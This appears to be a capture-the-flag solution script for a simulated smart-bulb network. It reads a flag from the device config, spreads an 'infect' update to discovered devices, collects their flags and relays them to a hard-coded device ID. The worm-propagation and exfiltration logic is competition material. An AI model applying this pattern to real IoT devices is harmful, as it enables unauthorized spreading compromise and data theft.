from api import LightBulb
from time import sleep


def extract_flag(message):
    try:
        return message[message.index("CTF{"): message.index("}") + 1]
    except ValueError:
        return ""


def compare_loss(id_correct, id_corrupted):
    return sum(ch1 != ch2 and ch2 != ' ' for ch1, ch2 in zip(id_correct, id_corrupted))


def compress_multiply_flag(flag):
    return 3 * flag.replace('.', '')


if __name__ == '__main__':

    obtained_flags = []
    bulb = LightBulb()
    flags = compress_multiply_flag(extract_flag(bulb.get_config()))
    infected_devices = []
    bulb.send_message("7ba0684d747d9dabf45500d15c3c2a04be259bbdef67f85ffe8b9d7652460324", flags)

    while True:
        things = bulb.discover_things()

        # stop after receiving STOP message
        message = bulb.read_input_message()
        if "STOP" in message:
            break
        elif "CTF" in message and "P5_" in message:
            if "P5_" not in obtained_flags:
                flags += message
                obtained_flags.append("P5_")
        # send back flag 3 times after receiving message
        # FLAGFLAGFLAG8028345879
        # where 8028345879 are first 10 digits of sender ID
        elif "FLAG" in message:
            flag_sender_id = message[12:22]
            for device in things:
                if compare_loss(device[:10], flag_sender_id) < 2:
                    sleep(1)
                    bulb.send_message(device, flags)
                    sleep(1)
        # forward update (infect) after receiving message
        # WORMWORMWORM8028345879
        # where 8028345879 are first 10 digits of device that we do not infect!
        elif "WORM" in message:
            # infect other devices
            things = bulb.discover_things()
            worm_sender_id = message[12:22]
            for device in things:
                if compare_loss(device[:10], worm_sender_id) > 1:
                    if bulb.forward_update(device):
                        infected_devices.append(device)
                        sleep(5)
                        bulb.send_message(device, "FLAGFLAGFLAG" + bulb.get_dev_id()[:10])
                        sleep(60)
                        received_message = bulb.read_input_message()
                        if "{" in received_message and "}" in received_message and "P5_" in received_message:
                            flags += received_message
                            obtained_flags.append("P5_")
                        sleep(15)
                        # bulb.send_message(device, "WORMWORMWORM" + bulb.get_dev_id()[:10])
                        # sleep(15)
                        bulb.send_message("7ba0684d747d9dabf45500d15c3c2a04be259bbdef67f85ffe8b9d7652460324", flags)

        sleep(10)
